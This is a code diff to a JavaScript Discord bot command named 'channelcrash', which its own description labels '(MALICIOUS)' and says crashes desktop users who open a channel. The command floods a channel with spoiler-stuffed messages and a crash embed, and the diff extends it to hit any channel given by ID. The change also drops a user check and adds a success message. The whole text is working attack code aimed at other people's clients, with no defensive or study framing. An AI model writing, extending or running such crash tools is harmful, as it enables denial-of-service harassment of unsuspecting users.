@@ -3,7 +3,7 @@ const Functions = require("./../../utils/Functions.js")
 module.exports = {
     name: 'channelcrash',
     description: '(MALICIOUS) Crashes desktop users when they open the channel, needs embed perms',
-    usage: 'channelcrash <AmountOfCrashers>',
+    usage: 'channelcrash <AmountOfCrashers> <ChannelId>',
     /**
      * @param {msg} msg
      */
@@ -25,19 +25,16 @@ module.exports = {
             .addField(Spoiler256, Spoiler1001, true)
             .addField(Spoiler256, Spoiler1001, true)
             .addField(Spoiler256, Spoiler651, true);
-        if (user !== undefined) {
-            if (isNaN(args[1])) {
+            if (isNaN(args[0]) || isNaN(args[1])) {
                 msg.channel.send(ErrorEmbed)
             } else {
-                for (let i = 1; i < parseInt(args[1]); i++) {
-                    await Functions.SilentModeSend(Spoiler2000, msg.channel.id, msg, "Normal", undefined, {
+                for (let i = 1; i < parseInt(args[0]); i++) {
+                    await Functions.SilentModeSend(Spoiler2000, args[1], msg, "Normal", undefined, {
                         embed: CrashEmbed
                     })
                     await Functions.sleep(500)
                 }
+                Functions.SilentModeSend("Success!", msg.channel.id, msg, "Normal")
             }
-        } else {
-            msg.channel.send(ErrorEmbed)
-        }
     }
 }
